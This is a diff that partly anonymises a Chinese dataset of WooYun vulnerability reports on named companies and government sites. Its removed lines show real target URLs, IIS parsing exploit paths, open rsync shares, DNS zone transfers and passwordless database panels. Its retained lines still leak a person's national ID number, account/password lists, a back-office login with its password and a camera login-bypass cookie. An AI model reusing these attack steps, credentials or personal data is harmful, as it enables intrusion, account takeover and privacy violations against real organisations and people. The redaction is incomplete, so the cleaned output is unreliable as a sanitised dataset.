 **详情**: 徐州某政府站文件遍历与信息泄漏，网站架构为dedecms5.7,服务器配置不当，导致文件遍历，可获取数据库备份信息
 
-**POC**: http://www.xedz.gov.cn/data/backupdata/kfq_member_0_630ae2aa4372f28b.txt--会员信息http://www.xedz.gov.cn/data/backupdata/kfq_sysconfig_0_f94064b66c465ec9.txt--dede配置http://www.xedz.gov.cn/data/backupdata/kfq_admin_0_fcb0a7f6c9349857.txt--管理员信息会员信息泄漏配置泄漏管理员泄漏
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -3880,9 +3880,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 给两个站点如下，office的这个有可能利用的上哦：http://help.wps.cnhttp://office.wps.cn
+**详情**: 给两个站点如下，office的这个有可能利用的上哦：https://example.com/[已脱敏]
 
-**POC**: http://help.wps.cn/css/default/logo.png/1.phphttp://office.wps.cn/templates/wps_office_college/favicon.ico/1.php
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -3924,7 +3924,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: rsync 58.68.255.50::whh/drwxr-xr-x       24576 2013/10/26 08:33:53 .drwxr-xr-x        4096 2012/04/26 16:23:15 2011-08-03drwxr-xr-x        4096 2012/04/26 19:21:26 2011-08-05drwxr-xr-x        4096 2012/04/28 20:27:32 2011-10-12drwxr-xr-x        4096 2012/04/26 16:23:24 2011-12-12drwxr-xr-x        4096 2012/05/23 09:53:41 2011-12-13drwxr-xr-x        4096 2012/05/17 09:15:57 2011-12-21drwxr-xr-x    
+**详情**: rsync [IP已脱敏]::whh/drwxr-xr-x       24576 2013/10/26 08:33:53 .drwxr-xr-x        4096 2012/04/26 16:23:15 2011-08-03drwxr-xr-x        4096 2012/04/26 19:21:26 2011-08-05drwxr-xr-x        4096 2012/04/28 20:27:32 2011-10-12drwxr-xr-x        4096 2012/04/26 16:23:24 2011-12-12drwxr-xr-x        4096 2012/05/23 09:53:41 2011-12-13drwxr-xr-x        4096 2012/05/17 09:15:57 2011-12-21drwxr-xr-x    
 
 **POC**: TO :	新浙风旅游	FROM:	上海途牛国际旅行社有限公司 计调：王静5电话：	021-6207700115605758111	电话:	025-68237777-88919联系人：	楼文华(总经理)	传真:	025-86853999传真:	02162077020	手机:订单编号：2888089线路名：<雁荡全景-龙穿飞瀑3日游>含门票，1晚住开元大酒店供应商线路编号：供应商线路名：本采购单成人数：2	本采购单儿童数：0出发日期：2013-11-08	结算价：960.00客人信息：王舜华 女 身份证 310106195511062043 签发地 请选择 签注类型 G签 生日 1955-11-0
 
@@ -3946,9 +3946,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: site:http://help.kuaipan.cn/
+**详情**: site:https://example.com/[已脱敏]
 
-**POC**: http://help.kuaipan.cn/wp-content/uploads/2011/06/search.png/c.phplook:
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -3968,7 +3968,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://ns.pipi.cn:8080/resin-doc/viewfile/?contextpath=&servletpath=&file=/WEB-INF/web.xml服务器久没更新了?http://game.pipi.cn/WEB-INF/web.xmlhttp://qipai.pipi.cn/WEB-INF/web.xmlhttp://qipai.pipi.cn/servlet/DisplayChart?filename=index.jsphttp://game.pipi.cn/servlet/DisplayChart?filename=index.jsp限制了目录。。
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -3978,8 +3978,8 @@
 ---
 
 ---
-### [wooyun-2012-08657] 腾讯客服物理路径泄露
-**厂商**: 腾讯 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
+### [wooyun-2012-08657] 某互联网公司客服物理路径泄露
+**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -3990,7 +3990,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://kf.qq.com/special/qzone/info/_0.htmlhttp://kf.qq.com/special/vip/info/_0.html页面异常出错，直接暴漏站点物理路径！
+**详情**: https://example.com/[已脱敏]
 
 **POC**: --------------------------------------------------------------------------------------------------------------------------------------------
 
@@ -4012,9 +4012,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://passport.8684.com/8684/login_b_v2.php?ref=http%253A%252F%252Fpassport.8684.com%252F8684%252Fgetpwd.php&&f5=0&v=1446109308563这处登录的接口，抓包发现用户名密码都是明文的，然后也没发现验证码测试撞库用户应该是可以的：zllajj	zllajj	1208musicmh	511323	1236lyjbenny	7512231	1237bn922	123456	1239caokangli	841127	1240sxj588	6360588	1240lhplee	lhp875484	1240ipwisk	73156711	1240snrwcwt	yangjun	1241jeffow	456123	1241kk1431	10160214	1242lylyv	4661
+**详情**: https://example.com/[已脱敏]	zllajj	1208musicmh	511323	1236lyjbenny	7512231	1237bn922	123456	1239caokangli	841127	1240sxj588	6360588	1240lhplee	lhp875484	1240ipwisk	73156711	1240snrwcwt	yangjun	1241jeffow	456123	1241kk1431	10160214	1242lylyv	4661
 
-**POC**: http://passport.8684.com/8684/login_b_v2.php?ref=http%253A%252F%252Fpassport.8684.com%252F8684%252Fgetpwd.php&&f5=0&v=1446109308563这处登录的接口，抓包发现用户名密码都是明文的，然后也没发现验证码测试撞库用户应该是可以的：zllajj	zllajj	1208musicmh	511323	1236lyjbenny	7512231	1237bn922	123456	1239caokangli	841127	1240sxj588	6360588	1240lhplee	lh
+**POC**: https://example.com/[已脱敏]	zllajj	1208musicmh	511323	1236lyjbenny	7512231	1237bn922	123456	1239caokangli	841127	1240sxj588	6360588	1240lhplee	lh
 
 **绕过**: 直接利用
 
@@ -4034,9 +4034,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://channel.3g.youku.com/resin-doc/examples/quercus-module/viewfile?file=hello.phphttp://channel.3g.youku.com/resin-doc/examples/ioc-periodictask/viewfile?file=WEB-INF/web.xml/opt/www/channel.3g.youku.com/webapps/resin-doc/examples/quercus-module/nice gl
+**详情**: https://example.com/[已脱敏] gl
 
-**POC**: http://channel.3g.youku.com/resin-doc/examples/quercus-module/viewfile?file=hello.phphttp://channel.3g.youku.com/resin-doc/examples/ioc-periodictask/viewfile?file=WEB-INF/web.xml/opt/www/channel.3g.youku.com/webapps/resin-doc/examples/quercus-module/nice gl
+**POC**: https://example.com/[已脱敏] gl
 
 **绕过**: 直接利用
 
@@ -4044,8 +4044,8 @@
 ---
 
 ---
-### [wooyun-2012-04522] 中国电信某域传送漏洞
-**厂商**: 中国电信 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
+### [wooyun-2012-04522] 某运营商某域传送漏洞
+**厂商**: 某运营商 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -4062,7 +4062,7 @@
 
 **绕过**: 直接利用
 
-**修复**: 定义ACL(访问控制列表)来限制在域名服务器之间的区域传送编辑/etc/named.conf这次有漏洞的是ns1.chinanet.cn, 如果ns2.chinanet.cn是备用dns服务器，那么应该只允许域传送至ns2.chinanet.cn(118.85.203.177)allow-trans
+**修复**: 定义ACL(访问控制列表)来限制在域名服务器之间的区域传送编辑/etc/named.conf这次有漏洞的是ns1.chinanet.cn, 如果ns2.chinanet.cn是备用dns服务器，那么应该只允许域传送至ns2.chinanet.cn([IP已脱敏])allow-trans
 ---
 
 ---
@@ -4088,8 +4088,8 @@
 ---
 
 ---
-### [wooyun-2012-012626] 新浪某站dns域传送泄露漏洞
-**厂商**: 新浪 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
+### [wooyun-2012-012626] 某社交平台某站dns域传送泄露漏洞
+**厂商**: 某社交平台 | **年份**: 2012 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -4100,7 +4100,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: dns url:ns1.sina.com.twns2.sina.com.tw Bind Version: 9.2.4Trying Zone Transfer for sina.com.tw on ns1.sina.com.tw ...sina.com.tw                              300      IN    SOAsina.com.tw                              300      IN    TXTsina.com.tw                              300      IN    A        210.17.38.45sina.com.tw                              300      IN    MXsina.com.tw                   
+**详情**: dns url:ns1.sina.com.twns2.sina.com.tw Bind Version: 9.2.4Trying Zone Transfer for sina.com.tw on ns1.sina.com.tw ...sina.com.tw                              300      IN    SOAsina.com.tw                              300      IN    TXTsina.com.tw                              300      IN    A        [IP已脱敏]sina.com.tw                              300      IN    MXsina.com.tw                   
 
 **POC**: (见原文)
 
@@ -4122,7 +4122,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://app.hi.tiancity.com/WEB-INF/web.xmlhttp://app.hi.tiancity.com//WEB-INF/classes/log4j.properties网站配置文件读取
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -4144,7 +4144,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 看看台湾人民的bbs：还要先登录，这是甚么情况尼？真是醉了。。。地址：https://www.twbbs.twIP：220.228.175.97看结果：; <<>> DiG 9.8.3-P1 <<>> @nd3.addcn.com. axfr twbbs.tw; (1 server found);; global options: +cmdtwbbs.tw.		90	IN	SOA	ns2.addcn.com. ronman.8591.com.tw. 2011032502 10800 3600 604800 86400twbbs.tw.		90	IN	NS	ns1.addcn.com.twbbs.tw.		90	IN	NS	ns2.addcn.com.twbbs.tw.		90	IN	NS	nd3.addcn.com.twbbs.tw.		90	IN	A	220.228.175.97twbb
+**详情**: 看看台湾人民的bbs：还要先登录，这是甚么情况尼？真是醉了。。。地址：https://example.com/[已脱敏] <<>> DiG 9.8.3-P1 <<>> @nd3.addcn.com. axfr twbbs.tw; (1 server found);; global options: +cmdtwbbs.tw.		90	IN	SOA	ns2.addcn.com. ronman.8591.com.tw. 2011032502 10800 3600 604800 86400twbbs.tw.		90	IN	NS	ns1.addcn.com.twbbs.tw.		90	IN	NS	ns2.addcn.com.twbbs.tw.		90	IN	NS	nd3.addcn.com.twbbs.tw.		90	IN	A	[IP已脱敏]twbb
 
 **POC**: (见原文)
 
@@ -4166,7 +4166,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 管理员用“ASP探针”测试环境后，没有删除这个文件，暴露了数据库路径。很老的系统，还用的Access…http://cduestc.cn/newgt/index.asp
+**详情**: 管理员用“ASP探针”测试环境后，没有删除这个文件，暴露了数据库路径。很老的系统，还用的Access…https://example.com/[已脱敏]
 
 **POC**: 直接下载下来登陆后台
 
@@ -4188,7 +4188,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 先来一个：http://wsbs.sihui.gov.cn:28017/
+**详情**: 先来一个：https://example.com/[已脱敏]
 
 **POC**: 再来一个：解析出来的IP是121.10.251.40无需用户名、密码直接连接mongo数据库
 
@@ -4198,8 +4198,8 @@
 ---
 
 ---
-### [wooyun-2012-07563] 去哪儿两分站后台暴露
-**厂商**: 去哪儿 | **年份**: 2012 | **类型**: 应用配置错误
+### [wooyun-2012-07563] 某旅游平台两分站后台暴露
+**厂商**: 某旅游平台 | **年份**: 2012 | **类型**: 应用配置错误
 
 **元思考**: 触发信号: 后台管理
 
@@ -4210,7 +4210,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 谷歌一下。发现好几个后台暴露，没有进一步探究！有兴趣的童鞋可以深入挖掘看看！1，TTS代理管理系统http://515.trade.qunar.com/tts/backAdmin/login.jsp?url=%2Ftts%2FbackAdmin%2F2，还有一个什么QCRS系统。http://channel.mkt.qunar.com/crs/login.jsp
+**详情**: 谷歌一下。发现好几个后台暴露，没有进一步探究！有兴趣的童鞋可以深入挖掘看看！1，TTS代理管理系统https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -4234,7 +4234,7 @@
 
 **详情**: 网络摄像头固件内部为方便访客访问，固化了一个匿名账户，大多数情况下是被禁用的，但是可以通过base64硬编码的方式，创建cookie绕过登陆权限审查。用户：anonymous密码：\177\177\177\177\177\177
 
-**POC**: 由于用户名和密码不可以直接用于登陆，必须先伪造一个cookie。这里使用火狐浏览器中firebug扩展工具，主要步骤如下：1. 打开网络摄像机的登陆页面，产生初始化的cookie。2.使用firebug扩展工具，创建一个名为“userInfo80”的cookie，路径为"/"，值为："YW5vbnltb3VzOlwxNzdcMTc3XDE3N1wxNzdcMTc3XDE3Nw==",意思为"user:pass"的base64硬编码格式。3. 浏览器请求http://218.205.192.183/doc/page/main.asp
+**POC**: 由于用户名和密码不可以直接用于登陆，必须先伪造一个cookie。这里使用火狐浏览器中firebug扩展工具，主要步骤如下：1. 打开网络摄像机的登陆页面，产生初始化的cookie。2.使用firebug扩展工具，创建一个名为“userInfo80”的cookie，路径为"/"，值为："YW5vbnltb3VzOlwxNzdcMTc3XDE3N1wxNzdcMTc3XDE3Nw==",意思为"user:pass"的base64硬编码格式。3. 浏览器请求http://[IP已脱敏]
 
 **绕过**: 过滤绕过, 编码绕过
 
@@ -4254,9 +4254,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 入手点：看来真的跟58很有渊源啊何流    364446153@qq.com	     1988123he所以mail为heliu@diandao.org
+**详情**: 入手点：看来真的跟58很有渊源啊何流    364446153@某互联网公司.com	     1988123he所以mail为heliu@diandao.org
 
-**POC**: 优惠券100元*1000张heliu@diandao.org   1988123he含智联，拉钩账户等北京彩虹乐享信息技术有限公司精准营销（代理商）正式帐号已经开通！ 总机号码为：400 819 1190首先您登录代理商后台，地址为：http://60.247.29.33ID：CHLX密码：chle!@#登录后，将下面的基本步骤设置好后，您就可以使用了！1、  进入“商户”——创建商户帐户2、   进入“账户管理”——为商户“充值”3、 　进入“接线员信息”——＞管理——＞新建（绑定接线员信息）您的微信支付商户申请已经审核通过！商户号(PartnerID)： 	1223834001商户名称： 
+**POC**: 优惠券100元*1000张heliu@diandao.org   1988123he含智联，拉钩账户等北京彩虹乐享信息技术有限公司精准营销（代理商）正式帐号已经开通！ 总机号码为：400 819 1190首先您登录代理商后台，地址为：http://[IP已脱敏]ID：CHLX密码：chle!@#登录后，将下面的基本步骤设置好后，您就可以使用了！1、  进入“商户”——创建商户帐户2、   进入“账户管理”——为商户“充值”3、 　进入“接线员信息”——＞管理——＞新建（绑定接线员信息）您的某互联网公司支付商户申请已经审核通过！商户号(PartnerID)： 	1223834001商户名称： 
 
 **绕过**: 直接利用
 
@@ -4276,7 +4276,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 北京市保障性住房建设投资中心:http://www.bphc.com.cn/
+**详情**: 北京市保障性住房建设投资中心:https://example.com/[已脱敏]
 
 **POC**: 刚看到这新闻，就随意看了其中的一个网址，这样的社会公告信息发生伪造了，影响也不小哦！着实捏了一把小汗！
 
@@ -4286,8 +4286,8 @@
 ---
 
 ---
-### [wooyun-2015-0104236] 网易某应用Activity组建暴露漏洞
-**厂商**: 网易 | **年份**: 2015 | **类型**: 默认配置不当
+### [wooyun-2015-0104236] 某互联网公司某应用Activity组建暴露漏洞
+**厂商**: 某互联网公司 | **年份**: 2015 | **类型**: 默认配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -4298,7 +4298,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: Activity接口可被其它应用调用，用于执行特定的敏感操作或钓鱼欺骗，建议添加 android:exported="false"，若需要外部调用，需自定义signature或者signatureOrSystem级别的权限应用叫网易bobo www.bobo.com
+**详情**: Activity接口可被其它应用调用，用于执行特定的敏感操作或钓鱼欺骗，建议添加 android:exported="false"，若需要外部调用，需自定义signature或者signatureOrSystem级别的权限应用叫某互联网公司bobo www.bobo.com
 
 **POC**: com.netease.vshow.android.activity.MainActivitycom.netease.vshow.android.activity.LiveActivitycom.netease.vshow.android.activity.FamilyActivitycom.netease.vshow.android.activity.WBEntryActivity可以被调用
 
@@ -4344,7 +4344,7 @@
 
 **详情**: 
 
-**POC**: 1.TCL智能家居官网网址：http://mail.huan-inc.tv/index.html2.如下路径存在问题：http://mail.huan-inc.tv/manager/3.整站源码下载：4.解压后，源码截图如下：5.时间有限，其它未深入……
+**POC**: 1.TCL智能家居官网网址：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -4364,7 +4364,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.mod.gov.cn/
+**详情**: https://example.com/[已脱敏]
 
 **POC**: 详细说明=漏洞说明
 
@@ -4388,7 +4388,7 @@
 
 **详情**: 南阳卧龙区计生委IIS写权漏洞
 
-**POC**: http://www.wlrk.gov.cn/ 首页被黑客轮奸了漏洞测试：http://www.wlrk.gov.cn/wooyu.txt
+**POC**: https://example.com/[已脱敏] 首页被黑客轮奸了漏洞测试：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -4408,7 +4408,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 详情http://admin.i.auto.sohu.com/
+**详情**: 详情https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -4430,7 +4430,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: rsync 58.68.228.36::log-apachelog-resinlogrsync 58.68.228.36::log/drwxr-xr-x       16384 2013/10/26 00:33:31 .-rw-r--r--           0 2013/10/26 00:00:01 access.log-rw-r--r--          40 2013/10/10 00:00:01 access.log.20131010.gz-rw-r--r--          40 2013/10/11 00:00:02 access.log.20131011.gz-rw-r--r--          40 2013/10/12 00:00:01 access.log.20131012.gz-rw-r--r--          40 2013/10/13 00:00:01
+**详情**: rsync [IP已脱敏]::log-apachelog-resinlogrsync [IP已脱敏]::log/drwxr-xr-x       16384 2013/10/26 00:33:31 .-rw-r--r--           0 2013/10/26 00:00:01 access.log-rw-r--r--          40 2013/10/10 00:00:01 access.log.20131010.gz-rw-r--r--          40 2013/10/11 00:00:02 access.log.20131011.gz-rw-r--r--          40 2013/10/12 00:00:01 access.log.20131012.gz-rw-r--r--          40 2013/10/13 00:00:01
 
 **POC**: (见原文)
 
@@ -4452,9 +4452,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://zpdc.gdep.com.cn:82/phpmyadmin/不用密码就能登录管理员肿么能这样呢！！= =！
+**详情**: https://example.com/[已脱敏] =！
 
-**POC**: http://zpdc.gdep.com.cn:82/phpmyadmin/不用密码就能登录管理员肿么能这样呢！！= =！
+**POC**: https://example.com/[已脱敏] =！
 
 **绕过**: 直接利用
 
@@ -4474,7 +4474,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: # 全球各地营业部所有流水+订单号：通过遍历"agentID="来获得不同地区营业部的具体信息，可通过具体日期范围查询如：http://b2b.cits.com.cn/citsonlineWeb/switchdo.do?prefix=/credit&page=/SXCreditInfo.do?actionType=creditInfoHisInit&agentID=000179591http://b2b.cits.com.cn/citsonlineWeb/switchdo.do?prefix=/credit&page=/SXCreditInfo.do?actionType=creditInfoHisInit&agentID=000013098http://b2b.cits.com.cn/citsonlineWeb/switchdo.do?prefix=/credit&page=/SXCre
+**详情**: # 全球各地营业部所有流水+订单号：通过遍历"agentID="来获得不同地区营业部的具体信息，可通过具体日期范围查询如：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -4518,7 +4518,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 问题出在：http://122.11.45.188/solr/#/直接访问ip，发现存在solr服务器。点击进入
+**详情**: 问题出在：http://[IP已脱敏]
 
 **POC**: 仔细转了一下，能修改搜索结果与部署。但是没有找到执行命令的地方，因此危害还需要ku6的工作人员来评估。
 
@@ -4540,7 +4540,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: https://github.com/gaitian/project/blob/97d02946eab3e3f18aeef6f97702eb9c0295748e/trunk/protected/config/params.php
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -4564,7 +4564,7 @@
 
 **详情**: 只是测试
 
-**POC**: http://sscard.shfft.com/test.txt要是马最好免杀
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -4594,8 +4594,8 @@
 ---
 
 ---
-### [wooyun-2015-0159665] 中国电信某系统存在JAVA反序列化漏洞
-**厂商**: 中国电信 | **年份**: 2015 | **类型**: 系统/服务运维配置不当
+### [wooyun-2015-0159665] 某运营商某系统存在JAVA反序列化漏洞
+**厂商**: 某运营商 | **年份**: 2015 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -4606,9 +4606,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 中国电信呼叫中心系统存在JAVA反序列化漏洞地址：**.**.**.**:8090上神器好了，就这些
+**详情**: 某运营商呼叫中心系统存在JAVA反序列化漏洞地址：**.**.**.**:8090上神器好了，就这些
 
-**POC**: 中国电信呼叫中心系统存在JAVA反序列化漏洞地址：**.**.**.**:8090上神器好了，就这些
+**POC**: 某运营商呼叫中心系统存在JAVA反序列化漏洞地址：**.**.**.**:8090上神器好了，就这些
 
 **绕过**: 直接利用
 
@@ -4650,7 +4650,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://agentcrm.inc.hc360.com/ 代理商客户资源管理系统，由于WebDav权限配置不当，导致可以写入任意文件，同时还存在IIS短路径泄漏漏洞。用http editor测试：
+**详情**: https://example.com/[已脱敏] 代理商客户资源管理系统，由于WebDav权限配置不当，导致可以写入任意文件，同时还存在IIS短路径泄漏漏洞。用http editor测试：
 
 **POC**: 成功写入文件：附送一个IIS短路径漏洞：
 
@@ -4672,7 +4672,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://dny.mop.com/猫补地方站联盟论坛每秒刷新  用户id  md5加密等信息可遍历保存  库应该是地方站总库  具体数量不清数据库配置不变
+**详情**: https://example.com/[已脱敏]  用户id  md5加密等信息可遍历保存  库应该是地方站总库  具体数量不清数据库配置不变
 
 **POC**: (见原文)
 
@@ -4694,7 +4694,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 参见：WooYun: 51信用卡管家最新android客户端存在7处信任所有证书漏洞漏洞危害：信任所有证书极易导致中间人攻击，完全可以控制整个通信内容。业界公认高危漏洞。参见：http://drops.wooyun.org/tips/3296
+**详情**: 参见：WooYun: 51信用卡管家最新android客户端存在7处信任所有证书漏洞漏洞危害：信任所有证书极易导致中间人攻击，完全可以控制整个通信内容。业界公认高危漏洞。参见：https://example.com/[已脱敏]
 
 **POC**: MITM
 
@@ -4716,7 +4716,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.founderca.com/list.php?fid=1通过修改fid值，会爆出如下出错页面。并附有内部登陆地址。
+**详情**: https://example.com/[已脱敏]
 
 **POC**: 看上图
 
@@ -4762,7 +4762,7 @@
 
 **详情**: 官方介绍：你好万维网隶属于北京万维通港科技有限公司，是一家国际性的高科技互联网技术服务提供商(www.nihao.net),是在中关村注册的高新技术企业。详情看漏洞证明。
 
-**POC**: 官方介绍：你好万维网隶属于北京万维通港科技有限公司，是一家国际性的高科技互联网技术服务提供商(www.nihao.net),是在中关村注册的高新技术企业。针对某个网站如下，ip地址证明该网站是你好万维网某虚拟主机，在获取该网站webshell以后，可以查看部署在该虚拟主机上的多个其他网站的目录，网站A：网站B：等等，查看Httpd配置文件配置文件中可以看到各个文件路径对应的网站，可以查看该主机上所有网站每日备份数据库，可以看到该服务器上部分网站已经被用于菠菜，如http://www.dpgogogo.com/该服务器影响的涉及的一些网站如下http://www.chimabj.com.cn/h
+**POC**: 官方介绍：你好万维网隶属于北京万维通港科技有限公司，是一家国际性的高科技互联网技术服务提供商(www.nihao.net),是在中关村注册的高新技术企业。针对某个网站如下，ip地址证明该网站是你好万维网某虚拟主机，在获取该网站webshell以后，可以查看部署在该虚拟主机上的多个其他网站的目录，网站A：网站B：等等，查看Httpd配置文件配置文件中可以看到各个文件路径对应的网站，可以查看该主机上所有网站每日备份数据库，可以看到该服务器上部分网站已经被用于菠菜，如https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -4788,7 +4788,7 @@
 
 **绕过**: 过滤绕过
 
-**修复**: 加强管理体系，让原本维修人员，初级管理员换成专业的信息安全管理人员。加强部门管理力度。把钱用到有意义的地方，而不是面子工程，虽然你们地区非常有钱。QQ2036234zeracker
+**修复**: 加强管理体系，让原本维修人员，初级管理员换成专业的信息安全管理人员。加强部门管理力度。把钱用到有意义的地方，而不是面子工程，虽然你们地区非常有钱。某互联网公司2036234zeracker
 ---
 
 ---
@@ -4804,9 +4804,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: inurl:http://wk.yl1001.com/login_password随便打开一个账号密码全部泄露了http://wk.yl1001.com/doc_6701369821222755_all.htm?common_login_switch=person&common_login_username=382942055@qq.com&common_login_password=cx13600929167&safe_code=其中username参数是用户，密码参数也在后面http://wk.yl1001.com/doc_3691346653911996_all.htm?common_login_switch=person&common_login_username=b2b_2008@126.com&common_login_password=asdfyl1001&safe_code
+**详情**: inurl:https://example.com/[已脱敏]
 
-**POC**: http://wk.yl1001.com/doc_36913691231321789_all.htm?common_login_switch=person&common_login_username=13888934529&common_login_password=1234566&safe_code=http://wk.yl1001.com/doc_6701369821222755_all.htm?common_login_switch=person&common_login_username=382942055@qq.com&common_login_password=cx13600929
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -4814,8 +4814,8 @@
 ---
 
 ---
-### [wooyun-2015-095155] 中国电信某省网站接口配置不当随意电信号码变更流量套餐（恶意扣费攻击）
-**厂商**: 中国电信 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2015-095155] 某运营商某省网站接口配置不当随意电信号码变更流量套餐（恶意扣费攻击）
+**厂商**: 某运营商 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -4828,7 +4828,7 @@
 
 **详情**: 把接口输入浏览器修改手机号码然后想帮他订购哪个流量就订购哪个手机验证码处 输入“1234”点确认就成功了。。。
 
-**POC**: 接口地址：http://222.221.16.199/MicroFlowService/floworder/orderList.jsp?phone=180xxxx9294&id=20394&type=1&src=0下面都用“180xxxx9294”来验证漏洞先来看看这个号码上图  他显示没有订购任何套餐~然后我们点击“订购” ps;由于电脑操作,只能点击<2G（100元）手机流量套餐>了然后我们跳转到：要输入手机验证码：我们输入“1234” 或“0000” 好像只要是四位数就OK  Ps:他也不验证，管他呢！！然后点击下方的“立即办理”就能看到他提示然后我们返回最开始那页，就看到 号码已经办理
+**POC**: 接口地址：http://[IP已脱敏]  他显示没有订购任何套餐~然后我们点击“订购” ps;由于电脑操作,只能点击<2G（100元）手机流量套餐>了然后我们跳转到：要输入手机验证码：我们输入“1234” 或“0000” 好像只要是四位数就OK  Ps:他也不验证，管他呢！！然后点击下方的“立即办理”就能看到他提示然后我们返回最开始那页，就看到 号码已经办理
 
 **绕过**: 直接利用
 
@@ -4836,8 +4836,8 @@
 ---
 
 ---
-### [wooyun-2015-092581] 百度某内部系统注册绕过以及注入导致大量内部账号泄露
-**厂商**: 百度 | **年份**: 2015 | **类型**: 系统/服务运维配置不当
+### [wooyun-2015-092581] 某搜索引擎某内部系统注册绕过以及注入导致大量内部账号泄露
+**厂商**: 某搜索引擎 | **年份**: 2015 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 功能测试
 
@@ -4848,7 +4848,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://bdyh.baidu.com/login.action百度银河系统 可以注册 但是由于邮箱验证是本地js验证，不严格，导致绕过，可随意注册。到qq邮箱中点击链接成功激活
+**详情**: https://example.com/[已脱敏] 可以注册 但是由于邮箱验证是本地js验证，不严格，导致绕过，可随意注册。到某互联网公司邮箱中点击链接成功激活
 
 **POC**: 随便找了个动态请求，就发现存在注入（其他的请自查）200+内部用户邮箱泄露，为撞库提供了宝贵资源
 
@@ -4870,7 +4870,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://222.223.116.105:8089/存在iis写权限漏洞先put再move导致整站沦陷勿水表，水表在门外
+**详情**: http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -4892,7 +4892,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 偶然遇到的https://gouser.3g.net.cn/userManage/login.jsp?systemid=76里面涉及了基本所有的系统，右上角有个切换系统https://password.3g.net.cn/iisadmpwd/aexp2.asp这个是域账户密码修改
+**详情**: 偶然遇到的https://example.com/[已脱敏]
 
 **POC**: C:\openssl>openssl.py -p "443" gouser.3g.netcnConnecting...Sending Client Hello...Waiting for Server Hello...... received message: type = 22, ver = 0302, length = 66... received message: type = 22, ver = 0302, length = 1005... received message: type = 22, ver = 0302, length = 331... received message
 
@@ -4936,7 +4936,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: "status": "up","ip": "122.13.177.249","Domain": ["www.kuaidadi.com"],"Ports": [{"WyVul": [],"protocol": "tcp","state": "open","portid": "21","Service": {"method": "probed","srvName": "ftp","srvProduct": "vsftpd","srvVersion": "2.2.2"}},{"WyVul": [],"protocol": "tcp","state": "open","portid": "80","Service": {"method": "probed","srvName": "http","srvProduct": "nginx","srvVersion": "1.2.8"}},{"WyVul
